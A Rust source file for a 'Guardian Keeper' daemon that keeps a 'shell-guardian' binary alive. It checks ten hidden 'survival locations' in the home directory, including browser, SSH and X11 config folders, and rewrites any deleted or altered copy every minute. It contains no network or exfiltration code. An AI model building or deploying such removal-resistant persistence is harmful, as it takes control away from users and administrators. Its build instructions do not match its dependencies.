// Guardian Keeper - Hardened with NASA + BSD security fixes
// Compile with: rustc -O guardian-keeper-fixed.rs

use std::env;
use std::fs::{self, File, OpenOptions};
use std::io::{self, Read, Write};
use std::path::{Path, PathBuf};
use std::process::{Command, exit};
use std::thread;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::collections::HashMap;

#[cfg(unix)]
use std::os::unix::fs::{OpenOptionsExt, PermissionsExt};

// Binary signature for validation
const KEEPER_SIGNATURE: &[u8] = b"KEEPER_FIXED_V1\0";
const GUARDIAN_SIGNATURE: &[u8] = b"GUARD_FIXED_V1\0";

// Survival locations with checksums
const SURVIVAL_LOCATIONS: [&str; 10] = [
    ".local/bin/shell-guardian",
    ".dotfiles/.guardian-shell/shell-guardian.bin",
    ".cache/.guardian-survival",
    ".config/guardian/bin/shell-guardian",
    ".local/share/guardian/shell-guardian",
    ".ssh/rc.guardian",  // BSD suggestion: don't overwrite real rc
    ".Xdefaults.guardian",  // X11 fallback
    ".config/.survival-guardian",
    ".local/state/.guardian-binary",
    ".mozilla/.guardian-backup"
];

// Configuration
const CHECK_INTERVAL: u64 = 60;
const MAX_REPAIR_ATTEMPTS: u32 = 3;
const CANARY_VALUE: u64 = 0xFEEDFACE_DEADBEEF;

// Global state
static RUNNING: AtomicBool = AtomicBool::new(true);
static MEMORY_CANARY: AtomicU64 = AtomicU64::new(CANARY_VALUE);
static REPAIR_COUNTER: AtomicU64 = AtomicU64::new(0);

// Signal handler
#[cfg(unix)]
extern "C" fn signal_handler(_: libc::c_int) {
    RUNNING.store(false, Ordering::SeqCst);
}

// Setup signals
#[cfg(unix)]
fn setup_signals() {
    unsafe {
        libc::signal(libc::SIGTERM, signal_handler as libc::sighandler_t);
        libc::signal(libc::SIGINT, signal_handler as libc::sighandler_t);
        libc::signal(libc::SIGPIPE, libc::SIG_IGN);
    }
}

// CRC32 checksum for binary validation
fn crc32(data: &[u8]) -> u32 {
    let mut crc: u32 = 0xFFFFFFFF;
    
    for &byte in data {
        crc ^= byte as u32;
        for _ in 0..8 {
            if crc & 1 != 0 {
                crc = (crc >> 1) ^ 0xEDB88320;
            } else {
                crc >>= 1;
            }
        }
    }
    
    !crc
}

// Validate binary has correct signature and structure
fn validate_binary(data: &[u8]) -> bool {
    // Check minimum size
    if data.len() < 1024 {
        return false;
    }
    
    // Check for ELF header
    if data.len() >= 4 && &data[0..4] == b"\x7fELF" {
        // Look for our signature in the binary
        for window in data.windows(GUARDIAN_SIGNATURE.len()) {
            if window == GUARDIAN_SIGNATURE {
                return true;
            }
        }
    }
    
    // Check for shebang
    if data.len() >= 2 && &data[0..2] == b"#!" {
        return true;
    }
    
    false
}

// Check memory integrity
fn check_memory_integrity() -> bool {
    MEMORY_CANARY.load(Ordering::SeqCst) == CANARY_VALUE
}

// Secure file creation
#[cfg(unix)]
fn create_file_secure(path: &Path) -> io::Result<File> {
    OpenOptions::new()
        .write(true)
        .create_new(true)
        .mode(0o600)
        .open(path)
}

#[cfg(not(unix))]
fn create_file_secure(path: &Path) -> io::Result<File> {
    OpenOptions::new()
        .write(true)
        .create_new(true)
        .open(path)
}

// Atomic file write with verification
fn write_binary_atomic(path: &Path, data: &[u8]) -> io::Result<()> {
    let temp_path = path.with_extension(format!("tmp.{}", std::process::id()));
    
    // Write to temporary file
    let mut file = create_file_secure(&temp_path)?;
    file.write_all(data)?;
    file.sync_all()?;
    drop(file);
    
    // Verify what we wrote
    let written_data = fs::read(&temp_path)?;
    if written_data != data {
        fs::remove_file(&temp_path)?;
        return Err(io::Error::new(io::ErrorKind::Other, "Write verification failed"));
    }
    
    // Set executable permissions
    #[cfg(unix)]
    {
        let mut perms = fs::metadata(&temp_path)?.permissions();
        perms.set_mode(0o755);
        fs::set_permissions(&temp_path, perms)?;
    }
    
    // Atomic rename
    fs::rename(&temp_path, path)?;
    
    Ok(())
}

// Find best source binary using consensus
fn find_source_binary(home: &Path) -> Result<(Vec<u8>, u32), String> {
    let mut candidates: HashMap<u32, (Vec<u8>, usize)> = HashMap::new();
    
    for location in SURVIVAL_LOCATIONS.iter() {
        let path = home.join(location);
        if let Ok(data) = fs::read(&path) {
            if validate_binary(&data) {
                let checksum = crc32(&data);
                let entry = candidates.entry(checksum).or_insert((data, 0));
                entry.1 += 1;
            }
        }
    }
    
    if candidates.is_empty() {
        return Err("No valid guardian binaries found".to_string());
    }
    
    // Find binary with most copies (consensus)
    let (checksum, (data, _)) = candidates.into_iter()
        .max_by_key(|(_, (_, count))| *count)
        .unwrap();
    
    Ok((data, checksum))
}

// Check and repair with circuit breaker
fn check_and_repair(home: &Path, repair_attempts: &mut HashMap<PathBuf, u32>) -> Result<usize, String> {
    // Check memory integrity first
    if !check_memory_integrity() {
        return Err("Memory corruption detected!".to_string());
    }
    
    // Find source binary
    let (source_data, source_checksum) = find_source_binary(home)?;
    
    let mut repaired = 0;
    
    for location in SURVIVAL_LOCATIONS.iter() {
        let path = home.join(location);
        
        // Circuit breaker - skip if too many failures
        let attempts = repair_attempts.get(&path).copied().unwrap_or(0);
        if attempts >= MAX_REPAIR_ATTEMPTS {
            continue;
        }
        
        // Create parent directory if needed
        if let Some(parent) = path.parent() {
            if !parent.exists() {
                if let Err(e) = fs::create_dir_all(parent) {
                    eprintln!("Failed to create {}: {}", parent.display(), e);
                    continue;
                }
            }
        }
        
        // Check if repair needed
        let needs_repair = match fs::read(&path) {
            Ok(data) => {
                let checksum = crc32(&data);
                checksum != source_checksum || !validate_binary(&data)
            }
            Err(_) => true,
        };
        
        if needs_repair {
            // Exponential backoff based on attempt count
            if attempts > 0 {
                thread::sleep(Duration::from_secs(1 << attempts));
            }
            
            match write_binary_atomic(&path, &source_data) {
                Ok(_) => {
                    repaired += 1;
                    REPAIR_COUNTER.fetch_add(1, Ordering::Relaxed);
                    repair_attempts.remove(&path);
                    println!("✓ Repaired: {}", path.display());
                }
                Err(e) => {
                    eprintln!("✗ Failed to repair {}: {}", path.display(), e);
                    *repair_attempts.entry(path).or_insert(0) += 1;
                }
            }
        }
    }
    
    Ok(repaired)
}

// Write status file
fn write_status(home: &Path) -> io::Result<()> {
    let status_path = home.join(".guardian-keeper.status");
    let timestamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    
    let repairs = REPAIR_COUNTER.load(Ordering::Relaxed);
    let status = format!("timestamp={},repairs={},pid={}\n", 
                        timestamp, repairs, std::process::id());
    
    fs::write(&status_path, status)
}

// Service mode
fn run_service() {
    println!("🛡️  Guardian Keeper (Hardened) starting...");
    println!("📍 PID: {}", std::process::id());
    
    let home = match env::var("HOME") {
        Ok(h) => PathBuf::from(h),
        Err(_) => {
            eprintln!("❌ HOME not set");
            exit(1);
        }
    };
    
    // Set restrictive umask
    #[cfg(unix)]
    unsafe {
        libc::umask(0o077);
    }
    
    // Setup signals
    #[cfg(unix)]
    setup_signals();
    
    // Circuit breaker state
    let mut repair_attempts: HashMap<PathBuf, u32> = HashMap::new();
    let mut last_status_write = Instant::now();
    
    // Set up Ctrl-C handler
    ctrlc::set_handler(move || {
        println!("\n🛑 Shutdown signal received");
        RUNNING.store(false, Ordering::SeqCst);
    }).expect("Error setting Ctrl-C handler");
    
    // Main service loop
    while RUNNING.load(Ordering::SeqCst) {
        match check_and_repair(&home, &mut repair_attempts) {
            Ok(repaired) => {
                if repaired > 0 {
                    println!("🔄 Repaired {} replicas", repaired);
                }
            }
            Err(e) => {
                eprintln!("❌ Check cycle failed: {}", e);
                if e.contains("Memory corruption") {
                    eprintln!("💀 FATAL: Memory corruption detected, exiting!");
                    exit(1);
                }
            }
        }
        
        // Write status file every 5 minutes
        if last_status_write.elapsed() > Duration::from_secs(300) {
            if let Err(e) = write_status(&home) {
                eprintln!("⚠️  Failed to write status: {}", e);
            }
            last_status_write = Instant::now();
        }
        
        // Interruptible sleep
        let start = Instant::now();
        while RUNNING.load(Ordering::SeqCst) && start.elapsed() < Duration::from_secs(CHECK_INTERVAL) {
            thread::sleep(Duration::from_millis(100));
        }
    }
    
    // Final status
    let _ = write_status(&home);
    
    println!("👋 Guardian Keeper stopped");
    println!("📊 Total repairs: {}", REPAIR_COUNTER.load(Ordering::Relaxed));
}

fn main() {
    let args: Vec<String> = env::args().collect();
    
    // Embed signature in binary
    let _signature = KEEPER_SIGNATURE;
    
    if args.len() > 1 && args[1] == "service" {
        run_service();
    } else {
        // Single check mode
        let home = match env::var("HOME") {
            Ok(h) => PathBuf::from(h),
            Err(_) => {
                eprintln!("❌ HOME not set");
                exit(1);
            }
        };
        
        let mut repair_attempts = HashMap::new();
        match check_and_repair(&home, &mut repair_attempts) {
            Ok(repaired) => {
                if repaired > 0 {
                    println!("✅ Repaired {} replicas", repaired);
                } else {
                    println!("✅ All replicas intact");
                }
                exit(0);
            }
            Err(e) => {
                eprintln!("❌ Error: {}", e);
                exit(1);
            }
        }
    }
}